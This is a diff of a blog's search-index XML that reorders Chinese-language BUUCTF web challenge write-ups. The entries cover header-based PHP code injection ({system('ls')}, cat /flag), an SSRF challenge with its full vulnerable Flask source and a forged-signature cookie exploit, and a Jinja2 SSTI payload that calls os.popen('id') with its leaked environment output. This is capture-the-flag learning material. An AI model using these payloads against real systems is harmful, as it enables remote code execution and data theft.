@@ -154,35 +154,6 @@
     
     
     <entry>
-      <title>[BJDCTF2020]The mystery of ip</title>
-      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/"/>
-      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/</url>
-      
-        <content type="html"><![CDATA[<p><strong>过程</strong></p><p>XFF和client-ip都可。发现可以控制输入</p><p>可以进行逻辑运算<code>&#123;7*8&#125;</code></p><p><code>client-ip:&#123;system(&#39;ls&#39;)&#125;</code>发现可以，尝试<code>cat /flag</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> wp </tag>
-            
-            <tag> 代码注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>[GWCTF 2019]我有一个数据库</title>
       <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
       <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
@@ -382,6 +353,35 @@
     
     
     <entry>
+      <title>[BJDCTF2020]The mystery of ip</title>
+      <link href="/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/"/>
+      <url>/2021/06/19/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E9%A2%98/%5BBJDCTF2020%5DThe%20mystery%20of%20ip/</url>
+      
+        <content type="html"><![CDATA[<p><strong>过程</strong></p><p>XFF和client-ip都可。发现可以控制输入</p><p>可以进行逻辑运算<code>&#123;7*8&#125;</code></p><p><code>client-ip:&#123;system(&#39;ls&#39;)&#125;</code>发现可以，尝试<code>cat /flag</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> wp </tag>
+            
+            <tag> 代码注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>php魔法函数</title>
       <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
       <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
@@ -432,6 +432,64 @@
             <tag> SSRF </tag>
             
             <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[De1CTF 2019]SSRF Me</title>
+      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/"/>
+      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):<span class="comment">#检测是以指定字符开头，不能用这两个协议</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>审计一下源码 这三个是要传的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br></pre></td></tr></table></figure><p>将三个参数传入TASK类中 调用TASK类中的EXEC方法</p><p>分析下三个参数：<br>第一个参数action是传入read和scan的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要read 才能读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">#action默认参数为scan</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>第二个参数传入一个文件名<code>根据提示是flag.txt</code><br>第三个参数sign是一个md5值<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密，考点应该在这里！</p><p>由于我们并没有secert_key的值，所以本来是没得办法的。</p><p>但是/geneSign路由，暴露了getSign函数，</p><p>我们可以根据路由getSign去得到正确的sign值。</p><p>访问一下geneSign传入参数param=flag.txtread得到一串MD5值：</p><p>f8c0d736fa2e823c2b488c82561c4732</p><p><code>然后让flag.txtread + scan拼接加密md5即为</code>sign</p><p>/Delta?param=flag.txt</p><p>Cookie:action=readscan;sign=f8c0d736fa2e823c2b488c82561c4732;</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> SSRF </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[Flask]SSTI</title>
+      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/"/>
+      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/</url>
+      
+        <content type="html"><![CDATA[<p>[Flask]SSTI</p><p>payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello HOSTNAME=d43aec63194a PYTHON_PIP_VERSION=19.3.1 HOME=/root GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=<a href="https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py">https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py</a> SERVER_SOFTWARE=gunicorn/20.0.0 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.6.9 PWD=/app PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee FLAG=flag{044b09a2-bb0b-4dcb-abac-f4ceb70ff40e} }</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> wp </tag>
+            
+            <tag> SSTI </tag>
             
         </tags>
       
@@ -527,64 +585,6 @@
     
     
     <entry>
-      <title>[De1CTF 2019]SSRF Me</title>
-      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/"/>
-      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/</url>
-      
-        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):<span class="comment">#检测是以指定字符开头，不能用这两个协议</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>审计一下源码 这三个是要传的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span 